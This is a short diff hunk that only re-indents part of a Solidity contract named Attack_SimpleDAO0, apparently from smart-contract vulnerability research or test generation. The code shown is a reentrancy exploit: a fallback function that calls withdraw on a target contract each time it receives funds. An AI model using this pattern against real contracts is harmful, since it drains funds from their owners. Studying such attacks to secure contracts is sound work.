@@ -22,7 +22,8 @@ contract Attack_SimpleDAO0 {
     target_contract.donate.value(vultron_amount)(to);
   } 
 
-  function() public payable {
-    target_contract.withdraw(10000);
-  }
-} 
+      function() public payable {
+        
+        target_contract.withdraw(10000);
+      }
+      } 
